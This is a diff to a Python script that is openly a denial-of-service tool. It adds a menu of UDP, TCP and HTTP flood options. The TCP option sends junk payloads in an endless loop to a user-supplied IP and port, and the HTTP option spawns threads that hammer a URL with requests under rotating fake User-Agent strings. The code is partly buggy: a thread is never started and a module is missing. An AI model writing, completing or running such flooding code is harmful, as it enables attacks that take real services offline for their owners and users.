@@ -4,24 +4,13 @@ import sys
 import time
 import cmd
 import os
-os.system('chcp 65001')
-print("+==================================================================+")
-print("|    ███████              █████      ███   █████              ████ |")
-print("|  ███░░░░░███           ░░███      ░░░   ░░███              ░░███ |")
-print("| ███     ░░███ ████████  ░███████  ████  ███████    ██████   ░███ |")
-print("|░███      ░███░░███░░███ ░███░░███░░███ ░░░███░    ░░░░░███  ░███ |")
-print("|░███      ░███░░███░░███ ░███░░███░░███ ░░░███░    ░░░░░███  ░███ |")
-print("|░░███     ███  ░███      ░███ ░███ ░███   ░███ ███ ███░░███  ░███ |")
-print("| ░░░███████░   █████     ████████  █████  ░░█████ ░░████████ █████|")
-print("|   ░░░░░░░    ░░░░░     ░░░░░░░░  ░░░░░    ░░░░░   ░░░░░░░░ ░░░░░ |")
-print("+==================================================================+")
-print("tst")
-
-
-def choice_prompt():
-    print("Select an option:")
-    print("Flood UDP")
-    print("Exit")
+import threading
+import requests
+print("Select an option:")
+print("1.Flood UDP")
+print("2.Flood TCP")
+print("3.Flood HTTP")
+print("4.Exit")
 
 choice = input("-->")
 
@@ -44,22 +33,62 @@ if choice == "1":
 elif choice == "2":
  target_ip = input("IP --> ")
  ipport = int(input("IP PORT --> "))
-
  client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
- print(f"Start attacking on {target_ip}{ipport}")
- 
+ print(f"Start attacking on {target_ip}:{ipport}")
+ client.connect((target_ip,ipport))
+ client.send(b"\x10" * 5024)
+ print(f"sending attack {target_ip}:{ipport}") 
+
+ #for _ in range(5):
  try:
-    while True:
-        client.connect((target_ip,ipport))
-        client.send(b"\x10" * 1024)
-        print(f"sending attack {target_ip}:{ipport}")
- except socket.error:
-       print("ERROR")
+   while True:
+       client.send(b"\x10" * 5024)
+       print(f"sending attack {target_ip}:{ipport}")
+ except KeyboardInterrupt:
+   client.close()
+   sys.exit()
+ except ConnectionResetError:
+   print("An existing connection was forcibly closed by the remote host - Most likely done by a firewall or something else")
+#try:
+   #while True:
+ #for _ in range(5):
+        #lient.connect((target_ip,ipport))
+       #client.send(b"\x10" * 1024)
+        #rint(f"sending attack {target_ip}:{ipport}")
+ #except KeyboardInterrupt:
+      #client.close()
+      #sys.exit()
+ #except socket.error:
+       #print("ERROR")
+elif choice == "3":
+ 
+ target_url = input("URL -->")
+ num_threads = int(input("Threads -->"))
+        
+ user_agents = [
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
+    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/537.36 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 11; SM-G998U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Mobile Safari/537.36"
+ ]
+  
+ def send_request():
+  while True:
+    try:
+       headers = {"User-Agent": random.choice(user_agents)}
 
+       response = requests.get(target_url, headers=headers)
+       print(f"Senting request with {headers}{['User-Agent']}")
+    except requests.exceptions.RequestException:
+     print("Connection failed.")
 
-#elif choice == "2":
-   #print("Exiting")
-#exit    
+ for _ in range(num_threads):
+   thread = threading.Thread(target=send_request)
+   thread.start
+   print(F"HTTP FLOOD HAS SHART IT {num_threads} ON {target_url}")      
+elif choice == "4":
+   print("Exiting")
+   exit    
  
 
 #if __name__=="__main__":
